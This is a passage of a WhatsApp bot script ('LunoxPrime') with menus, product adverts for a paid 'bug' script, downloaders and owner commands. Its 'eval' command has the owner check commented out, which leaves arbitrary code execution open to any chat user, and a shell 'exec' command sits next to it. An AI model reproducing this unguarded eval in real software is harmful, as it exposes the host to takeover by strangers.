                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "𝘐𝘯𝘧𝘰 𝘜𝘱𝘥𝘢𝘵𝘦 𝘚𝘤𝘳𝘪𝘱𝘵",
                            sections: [
                                {
                                    title: "# X - Developer Info",
                                    highlight_label: "label",
                                    rows: [
                                        {
                                            title: "Saluran WhatsApp Lunox 👇🏻", 
                                            description: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U\n\n> Jangan Lupa Follow Agar Tidak Ketinggalan Tentang Update Script Bug Terbarunya.",
                                            id: "row_1"
                                        },
                                        { 
                                            title: "Saluran Telegram Lunox 👇🏻",
                                            description: "t.me/aubotyanz",
                                            id: "row_2"
                                        }
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘊𝘳𝘦𝘥𝘪𝘵𝘴 : 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: "123456789",
                            copy_code: "https://t.me/Pinnxyz"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘴𝘪 𝘖𝘸𝘯𝘦𝘳 𝘓𝘶𝘯𝘰𝘹",
                            id: `.creator`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chwa`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chtele`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘉𝘶𝘨𝘮𝘦𝘯𝘶",
                            id: `.bugmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘸𝘯𝘦𝘳𝘮𝘦𝘯𝘶",
                            id: `.ownermenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘛𝘰𝘰𝘭𝘴𝘮𝘦𝘯𝘶",
                            id: `.toolsmenu`
                            })
                    },
				    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘎𝘳𝘰𝘶𝘱𝘔𝘦𝘯𝘶",
                            id: `.groupmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘶𝘱𝘱𝘰𝘳𝘵 𝘗𝘳𝘰𝘫𝘦𝘤𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.thanksto`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘤𝘳𝘪𝘱𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.scbug`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘗𝘳𝘰𝘥𝘶𝘤𝘵 𝘗𝘪𝘯𝘻𝘺",
                            id: `.allprodukpinzy`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘈𝘭𝘭 𝘕𝘢𝘮𝘦 𝘗𝘢𝘳𝘵𝘯𝘦𝘳 𝘗𝘪𝘯𝘻𝘺",
                            id: `.partnerpinzy`
                        })
                    }
                ]
            }
        }
    }, { quoted: fquoted.channel });
    await sleep(2000)
    client.sendMessage(m.chat, {
        audio: { url: `https://files.catbox.moe/b352na.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: qpayment });
      }
      break;   

		  case "groupmenu":{
    //    if (!isBot) return
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const usedMem = totalMem - freeMem;
    const formattedUsedMem = formatSize(usedMem);
    const formattedTotalMem = formatSize(totalMem);
    let timestamp = speed()
    let latensi = speed() - timestamp
    let menu = `  ▢ 𝘉𝘰𝘵𝘯𝘢𝘮𝘦 : 𝙇𝙪𝙣𝙤𝙭 𝙋𝙧𝙞𝙢𝙚
  ▢ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯 : Private Only
  ▢ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳 : t.me/Pinnxyz

 ╭▢ *Owner Menu*
 │.tagall
 │.antilinkgb
 ╰▢`
    await reaction(m.chat, "🔐")
    await sleep(1000);
    await reaction(m.chat, "⌛")
    await sleep(1000);
    await reaction(m.chat, "🕚")
    await sleep(1000);
    await reaction(m.chat, "👤")
    await client.sendMessage(m.chat, {
        interactiveMessage: {
            title: menu,
            footer: config.settings.footer,
            thumbnail: "https://files.catbox.moe/lck4pw.jpg",
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "𝘛𝘪𝘬𝘛𝘰𝘬 @𝘗𝘪𝘯𝘻𝘺𝘖𝘧𝘧𝘪𝘤𝘪𝘢𝘭",
                        url: "t.me/Pinnxyz",
                        copy_code: "999999999999999999",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "𝐘𝐓 𝐏𝐢𝐧𝐳𝐲𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥-𝐈𝐃",
                        button_title: "𝐒𝐡𝐨𝐰 𝐅𝐢𝐭𝐮𝐫"
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://t.me/Pinnxyz",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "𝘐𝘯𝘧𝘰 𝘜𝘱𝘥𝘢𝘵𝘦 𝘚𝘤𝘳𝘪𝘱𝘵",
                            sections: [
                                {
                                    title: "# X - Developer Info",
                                    highlight_label: "label",
                                    rows: [
                                        {
                                            title: "Saluran WhatsApp Lunox 👇🏻", 
                                            description: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U\n\n> Jangan Lupa Follow Agar Tidak Ketinggalan Tentang Update Script Bug Terbarunya.",
                                            id: "row_1"
                                        },
                                        { 
                                            title: "Saluran Telegram Lunox 👇🏻",
                                            description: "t.me/aubotyanz",
                                            id: "row_2"
                                        }
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘊𝘳𝘦𝘥𝘪𝘵𝘴 : 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: "123456789",
                            copy_code: "https://t.me/Pinnxyz"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘴𝘪 𝘖𝘸𝘯𝘦𝘳 𝘓𝘶𝘯𝘰𝘹",
                            id: `.creator`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chwa`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘓𝘶𝘯𝘰𝘹",
                            id: `.chtele`
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘉𝘶𝘨𝘮𝘦𝘯𝘶",
                            id: `.bugmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘸𝘯𝘦𝘳𝘮𝘦𝘯𝘶",
                            id: `.ownermenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘛𝘰𝘰𝘭𝘴𝘮𝘦𝘯𝘶",
                            id: `.toolsmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘎𝘳𝘰𝘶𝘱𝘔𝘦𝘯𝘶",
                            id: `.groupmenu`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘚𝘶𝘱𝘱𝘰𝘳𝘵 𝘗𝘳𝘰𝘫𝘦𝘤𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.thanksto`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘤𝘳𝘪𝘱𝘵 𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦",
                            id: `.scbug`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘗𝘳𝘰𝘥𝘶𝘤𝘵 𝘗𝘪𝘯𝘻𝘺",
                            id: `.allprodukpinzy`
                            })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "𝘈𝘭𝘭 𝘕𝘢𝘮𝘦 𝘗𝘢𝘳𝘵𝘯𝘦𝘳 𝘗𝘪𝘯𝘻𝘺",
                            id: `.partnerpinzy`
                        })
                    }
                ]
            }
        }
    }, { quoted: fquoted.channel });
    await sleep(2000)
    client.sendMessage(m.chat, {
        audio: { url: `https://files.catbox.moe/b352na.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: qpayment });
      }
      break;   
      
case "script":
case "buyscript":
case "buysc":
case "beli":
case "belisc":
case "minta":
case "scbug":
case "bagi":
case "sc": {
                await client.sendMessage(m.chat,{
                    productMessage: {
                        title: "𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦 - 𝘞𝘢𝘉𝘰𝘵2026!",
                        description: "𝘐𝘯𝘪 𝘈𝘥𝘢𝘭𝘢𝘩 𝘋𝘦𝘬𝘳𝘪𝘱𝘴𝘪 𝘗𝘳𝘰𝘥𝘶𝘤𝘵 𝘗𝘪𝘯𝘻𝘺",
                        thumbnail: { url: "https://img1.pixhost.to/images/10671/668571049_file_1764970098371.jpg" },
                        productId: "PROD001",
                        retailerId: "RETAIL001",
                        url: "https://t.me/Pinnxyz",
                        body: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘤𝘳𝘪𝘱𝘵 𝘐𝘴 𝘏𝘦𝘳𝘦",
                        footer: config.settings.footer,
                        priceAmount1000: 777,
                        currencyCode: "IDR",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘤𝘳𝘪𝘱𝘵 𝘓𝘶𝘯𝘰𝘹",
                                    url: "https://wa.me/6285183387097?text=*Assalamualaikum%20Pinzy%20Mau%20Buy%20Script%20Lunox%20🙏*"
                                })
                            }
                        ]
                    }
                }, { quoted: fquoted.channel });
            }
            break;

 case "chwa": {
                await client.sendMessage(m.chat,{
                    productMessage: {
                        title: "𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦 - 𝘞𝘢𝘉𝘰𝘵2026!",
                        description: "𝘐𝘯𝘪 𝘈𝘥𝘢𝘭𝘢𝘩 𝘋𝘦𝘬𝘳𝘪𝘱𝘴𝘪 𝘗𝘳𝘰𝘥𝘶𝘤𝘵",
                        thumbnail: { url: "https://img1.pixhost.to/images/10671/668571049_file_1764970098371.jpg" },
                        productId: "PROD001",
                        retailerId: "RETAIL001",
                        url: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U",
                        body: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘐𝘴 𝘏𝘦𝘳𝘦",
                        footer: config.settings.footer,
                        priceAmount1000: 777,
                        currencyCode: "IDR",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘞𝘩𝘢𝘵𝘴𝘢𝘱𝘱 𝘓𝘶𝘯𝘰𝘹",
                                    url: "https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U"
                                })
                            }
                        ]
                    }
                }, { quoted: fquoted.channel });
            }
            break;

case "allprodukpinzy": {
                await client.sendMessage(m.chat,{
                    productMessage: {
                        title: "𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦 - 𝘞𝘢𝘉𝘰𝘵2026!",
                        description: "𝘐𝘯𝘪 𝘈𝘥𝘢𝘭𝘢𝘩 𝘋𝘦𝘬𝘳𝘪𝘱𝘴𝘪 𝘗𝘳𝘰𝘥𝘶𝘤𝘵",
                        thumbnail: { url: "https://img1.pixhost.to/images/10671/668571049_file_1764970098371.jpg" },
                        productId: "PROD001",
                        retailerId: "RETAIL001",
                        url: "https://t.me/Pinnxyz",
                        body: "*List Product PinzyOfficial*\n- Full Up Otax 60k\n- Reseller Otax 80k\n- Script Lunox Private 50k\n- Partner Pribadi Pinzy 100k",
                        footer: config.settings.footer,
                        priceAmount1000: 777,
                        currencyCode: "IDR",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𝘖𝘳𝘥𝘦𝘳 𝘚𝘦𝘬𝘢𝘳𝘢𝘯𝘨",
                                    url: "https://t.me/Pinnxyz"
                                })
                            }
                        ]
                    }
                }, { quoted: fquoted.channel });
            }
            break;            

 case "chtele": {
                await client.sendMessage(m.chat,{
                    productMessage: {
                        title: "𝘓𝘶𝘯𝘰𝘹𝘗𝘳𝘪𝘮𝘦 - 𝘞𝘢𝘉𝘰𝘵2026!",
                        description: "𝘐𝘯𝘪 𝘈𝘥𝘢𝘭𝘢𝘩 𝘋𝘦𝘬𝘳𝘪𝘱𝘴𝘪 𝘗𝘳𝘰𝘥𝘶𝘤𝘵",
                        thumbnail: { url: "https://img1.pixhost.to/images/10671/668571049_file_1764970098371.jpg" },
                        productId: "PROD001",
                        retailerId: "RETAIL001",
                        url: "https://t.me/aubotyanz",
                        body: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘐𝘴 𝘏𝘦𝘳𝘦",
                        footer: config.settings.footer,
                        priceAmount1000: 777,
                        currencyCode: "IDR",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𝘚𝘢𝘭𝘶𝘳𝘢𝘯 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘓𝘶𝘯𝘰𝘹",
                                    url: "https://t.me/aubotyanz"
                                })
                            }
                        ]
                    }
                }, { quoted: fquoted.channel });
            }
            break;             
                        

//BAGIAN CASE MAIN MENU ATAU OWNER                          
case "partnerpinzy": {
const menu = `𝘿𝘼𝙁𝙏𝘼𝙍 𝘼𝙇𝙇 𝙋𝘼𝙍𝙏𝙉𝙀𝙍 𝙋𝙄𝙉𝙕𝙔

𝗡𝗔𝗠𝗘 𝗔𝗟𝗟 :
- Name 1 : Pinzy
- Name 2 : Ikyz
- Name 3 : Skyz
- Name 4 : Radit
- Name 5 : Yanz
- Name 6 : Saka
- Name 7 : LiuLan
- Name 8 : Xyroo Official
- Name 9 : Faris Official
- Name 10 : RidzMods
- Name 11 : Xyzeen

𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗣𝗔𝗥𝗧𝗡𝗘𝗥 :
- Pinzy : t.me/Pinnxyz
- Ikyz : t.me/IkyzBack
- Skyz : t.me/taaqz
- Radit : t.me/Radityaa_m
- Yanz : t.me/yatimss
- Saka : t.me/kanotdevx
- LiuLan : t.me/LiuuLan
- Xyroo Official : t.me/XyrooOffc
- Faris Official : t.me/FriszzOff
- RidzMods : t.me/Faridzz
- Xyzeen : t.me/xyzenreal
> 𝘚𝘦𝘭𝘢𝘪𝘯 𝘜𝘴𝘦𝘳𝘯𝘢𝘮𝘦 𝘛𝘦𝘭𝘦𝘨𝘳𝘢𝘮 𝘋𝘪 𝘈𝘵𝘢𝘴 𝘋𝘪 𝘗𝘢𝘴𝘵𝘪𝘬𝘢𝘯 𝘊𝘭𝘰𝘯𝘦

#𝗡𝗢𝗧𝗘 : Mau Beli Lewat Owner? Tinggal Pilih Mau Order Di Owner Siapa, All Owner Jamin Amanah Yo.
`
client.sendMessage(m.chat, {text: menu}, {quoted: qchanel})
}
break

case "creator": {
const menu = `𝙄𝙉𝙁𝙊 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 𝙇𝙪𝙣𝙤𝙭𝙋𝙧𝙞𝙢𝙚
- 𝘖𝘵𝘩𝘦𝘳 : PinzyMoods

𝗖𝗢𝗡𝗧𝗔𝗖𝗦 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 :
- Whatsapp : wa.me/6285183387097
- Telegram : t.me/Pinnxyz
- Saluran : t.me/kafours
- Gb Public : t.me/lunoxgbpublic1

➤  ｢ 𝗦𝗔𝗟𝗨𝗥𝗔𝗡 𝗜𝗡𝗙𝗢 𝗨𝗣𝗗𝗔𝗧𝗘 𝗦𝗖𝗥𝗜𝗣𝗧 ｣ 
https://whatsapp.com/channel/0029Vb7LQp1AojYtRXxiCT2U
`
client.sendMessage(m.chat, {text: menu}, {quoted: qchanel})
}
break

case "thanksto":
case "tangankanan-justin": {
const menu = `╭⊱ [ 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 ]*
┃❏ Support 1 : Allah ( 𝗠𝘆 𝗚𝗼𝗼𝗱 )
┃❏ Support 2 : Orang tua ( 𝗠𝘆 𝗪𝗶𝗳𝗲 )
┃❏ Support 3 : Pinzy ( 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 )
┃❏ Support 5 : Yanz ( 𝗙𝗿𝗶𝗲𝗻𝗱𝘀 𝗜 )
┃❏ Support 6 : Skyz ( 𝗙𝗿𝗶𝗲𝗻𝗱𝘀 𝗜𝗜 )
┃❏ Support 7 : Saka ( 𝗙𝗿𝗶𝗲𝗻𝗱𝘀 𝗜𝗜𝗜 )
┃❏ Support 4 : Malzz ( 𝗙𝗿𝗶𝗲𝗻𝗱𝘀 𝗜𝗩 )
┃❏ Support 8 : Ikyz ( 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 𝗜 )
┃❏ Support 9 : LiuLan ( 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 𝗜𝗜 )
┃❏ Support 10 : Faridz ( 𝗦𝘂𝗽𝗽𝗼𝗿𝘁 𝗜𝗜𝗜 )
┃❏ Support 11 : 𝗔𝗟𝗟 𝗕𝗨𝗬𝗘𝗥 / 𝗠𝗘𝗠𝗕𝗘𝗥 𝗟𝗨𝗡𝗢𝗫
╰━━━━━━━━━━━━━━━━━━━
`
client.sendMessage(m.chat, {text: menu}, {quoted: fquoted.channel})
}
break
	        
case "tt":
            case "tiktok": {
                if (!text) return reply(config.message.ex + prefix + command + " url tiktok")
                const tiktokRegex = /(https?:\/\/)?(www\.)?(vm|vt|m|www)?\.?tiktok\.com\/[^\s]+/i;
                if (!tiktokRegex.test(text)) return reply("URL TikTok tidak valid")
                const api = await fetch(`https://rynekoo-api.hf.space/downloader/tiktok?url=${encodeURIComponent(text)}`);
                const res = await api.json();
                const data = res.result;
                return await client.sendMessage(m.chat, {
                    video: { url: data.videoUrl },
                    caption: data.title || "TikTok Downloader"
                }, { quoted: fquoted.channel });
            }
            break      
				
case 'tourl': {
                
                if (!/video/.test(mime) && !/image/.test(mime)) return m.reply(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}`);
                let pnis = await m.quoted ? m.quoted : m;
                let media = await pnis.download();
                let link = await TelegraPh(media);
                await sleep(1000);
                await m.reply(`${link}`);
            }
            break

case 'cc':
case 'capcut': {
	
function download(url) {
  return new Promise(async(resolve, reject) => {
    try {
      let cc = await axios.get(url, {
        headers: {
          'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
        }
      }).then(x => x.data)
      
      let dataMatch = /<script nonce="argus-csp-token">window\._ROUTER_DATA = (.*?)<\/script>/;
      if (cc.match(dataMatch)) {
        let getJson = JSON.parse(cc.match(dataMatch)[1]).loaderData['template-detail_$'].templateDetail
        if (getJson.templateId) {
          resolve({ status: true, mess: `Berhasil mengambil data`, data: getJson })
        } else {
          resolve({ status: false, mess: `Tidak ada metadata tersedia`})
        }
      }
    } catch(e) {
      reject({ status: false, mess: `Gagal mengambil metadata`})
    }
  })
}

if (!text.includes('www.capcut.net')) return m.reply('Masukin link Capcut Dongo 😹')
let hasil = await download(text)

try {

let clientCcDnL = `⏤͟͟͞͞╳── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴄᴄ ]* ── .々─ᯤ\n`
clientCcDnL += `│    =〆 ᴛɪᴛʟᴇ: ${hasil.data.title}\n`
clientCcDnL += `│    =〆 ᴅᴇsᴄ: ${hasil.data.desc}\n`
clientCcDnL += `│    =〆 ɪᴅ: ${hasil.data.templateId}\n`
clientCcDnL += `│    =〆 ᴜʀʟ: ${hasil.data.structuredData.url}\n`
clientCcDnL += `⏤͟͟͞͞╳────────── .✦`

await client.sendMessage(m.chat, { video: { url: hasil.data.videoUrl }, caption: clientCcDnL }, { quoted: m })

} catch (e) {
 m.reply('Yah Error Jir')
}

}
break

case "cekidch": {
if (!text) return m.reply("linkchnya")
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await client.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
m.reply(teks)
}
break;
                             
             case "self":{
                        await reaction(m.chat, "⏳")
             await sleep(2500);
             await reaction(m.chat, "✅")
                if (!isOwner) return reply("`Kusus Owner`") 
                client.public = false
                reply(`successfully changed to ${command}`)
            }
            break;           
                        case "public":{
                        await reaction(m.chat, "⏳")
             await sleep(2500);
             await reaction(m.chat, "✅")
                if (!isOwner) return reply("`Kusus Owner`") 
                client.public = true
                reply(`successfully changed to ${command}`)
            }
            break;                         
                
            case "mesinfo": {
                if (!m.quoted) return reply("harap reply ke sebuah pesan untuk mengecek mtype dan id-nya.");
             
                const type = m.quoted.mtype;
                const id = m.quoted.id;
                reply(`Pesan yang di-reply memiliki:\n- Tipe pesan: *${type}*\n- ID pesan: *${id}*`);
            }
            break;

case "sbrat":
case "brat": {
                if (!text) return reply(config.message.ex + prefix + command + " hai")
                
                let yes = "https://brat.siputzx.my.id/image?text=" + encodeURIComponent(text) + "&background=%23ffffff&color=%23000000&emojiStyle=apple"
                return client.sendImageAsSticker(m.chat, yes, m, { 
                    packname: config.settings.packname,
                    author: config.settings.author 
                })
            }
            break
            
case "swgroup":
case "swgrup":
case "swgc": {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await client.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    m.react("✅️")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await client.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    m.react("✅️")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await client.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    m.react("✅️")
                } else if (caption) {
                    await client.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    m.react("✅️")
                } else {
                    await reply(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai`);
                }
            }
            break;
            case "get":{
                if (!isOwner) return reply(config.message.owner)
             //   if (!isBot) return
                if (!/^https?:\/\//.test(text)) return reply(`*ex:* ${prefix + command} https://kyuurzy.site`);
                const ajg = await fetch(text);
                await reaction(m.chat, "⏳")
                await sleep(2500);
                await await reaction(m.chat, "✅")
                
                if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
                    throw `Content-Length: ${ajg.headers.get("content-length")}`;
                }

                const contentType = ajg.headers.get("content-type");
                if (contentType.startsWith("image/")) {
                    return client.sendMessage(m.chat, {
                        image: { url: text }
                    }, { quoted: fquoted.channel });
                }
        
                if (contentType.startsWith("video/")) {
                    return client.sendMessage(m.chat, {
                        video: { url: text } 
                    }, { quoted: fquoted.channel });
                }
                
                if (contentType.startsWith("audio/")) {
                    return client.sendMessage(m.chat, {
                        audio: { url: text },
                        mimetype: 'audio/mpeg', 
                        ptt: true
                    }, { quoted: fquoted.channel });
                }
        
                let alak = await ajg.buffer();
                try {
                    alak = util.format(JSON.parse(alak + ""));
                } catch (e) {
                    alak = alak + "";
                } finally {
                    return reply(alak.slice(0, 65536));
                }
            }
            break
            case "insp": {
                if (!isOwner) return reply(config.message.owner)
          //      if (!isBot) return
                if (!text && !m.quoted) return reply(`*reply:* ${prefix + command}`);
                let quotedType = m.quoted?.mtype || '';
                let penis = JSON.stringify({ [quotedType]: m.quoted }, null, 2);
                const acak = `insp-${crypto.randomBytes(6).toString('hex')}.json`;
                
                await client.sendMessage(m.chat, {
                    document: Buffer.from(penis),
                    fileName: acak,
                    mimetype: "application/json"
                }, { quoted: fquoted.channel })
            }
            break
            case 'tagall':{
                if (!isOwner) return reply(config.message.owner)
         //       if (!isBot) return
                const textMessage = args.join(" ") || "nothing";
                let teks = `tagall message :\n> *${textMessage}*\n\n`;
                const groupMetadata = await client.groupMetadata(m.chat);
                const participants = groupMetadata.participants;
                for (let mem of participants) {
                    teks += `@${mem.id.split("@")[0]}\n`;
                }

                client.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }, { quoted: fquoted.channel });
            }
            break
            case "exec": {
                if (!isOwner) return reply(config.message.owner)
            //    if (!isBot) return;
                if (!budy.startsWith(".exec")) return;
                
                const { exec } = require("child_process");
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return reply(`*ex:* ${prefix + command} ls`);
                exec(args, (err, stdout) => {
                    if (err) return reply(String(err));
                    if (stdout) return reply(stdout);
                });
            }
            break;
            case "eval": {
            //    if (!isOwner) return reply(config.message.owner)
            //    if (!isBot) return;
                if (!budy.startsWith(".eval")) return;
                
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return reply(`*ex:* ${prefix + command} m.chat`);
                let teks;
                try {
                    teks = await eval(`(async () => { ${args.startsWith("return") ? "" : "return"} ${args} })()`);
                } catch (e) {
                    teks = e;
                } finally {
                    await reply(require('util').format(teks));
                }
            }
            break;
                
            case 'addown':
            case 'addowner': {
                if (!isOwner) return reply(config.message.owner)
                if (!q) return reply(`— ex: ${prefix + command} 62`);
                
                let bijipler = q.replace(/[^0-9]/g, "")
                if (bijipler.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`)
                let add = bijipler + '@s.whatsapp.net'
                
                let capt = `anda kini telah mendapatkan akses owner ke bot`
                kontributor.push(bijipler)
                fs.writeFileSync(path.resolve(__dirname, './Lunox-Prime/lib/database/owner.json'), JSON.stringify(kontributor), 'utf8')
                reply("berhasil menambahkan ke daftar owner")
                await reaction(m.chat, "⏳")
            await sleep(2500);
            await reaction(m.chat, "✅")
                await sleep(5000)
                m.reply(capt, add)
            }
            break
            case 'dellown':
            case 'dellowner':
            case 'delowner':{
                if (!isOwner) return reply(config.message.owner)
                if (!q) return reply(`— ex: ${prefix + command} 62`);
            
                let bijipler = q.replace(/[^0-9]/g,"")
                if (bijipler.startsWith('0')) return reply(`— ex: ${prefix + command} 62 !!`)
                let index = kontributor.indexOf(bijipler)
                if (index>-1) {
                    kontributor.splice(index,1)
                    fs.writeFileSync(path.resolve(__dirname,'./Lunox-Prime/lib/database/owner.json'),JSON.stringify(kontributor),'utf8')
                    reply("owner berhasil dihapus")
                    await reaction(m.chat, "⏳")
            await sleep(3500);
            await reaction(m.chat, "✅")
                } else {
                    reply("nomor tidak ditemukan dalam daftar owner")
                }
            }
            break

case 'iqc': {
 try {
 if (!text) {
 return Reply('Format salah! Gunakan: .iqc jam|batre|pesan\nContoh: .iqc 18:00|40|hai hai');
 }

 const parts = text.split('|');
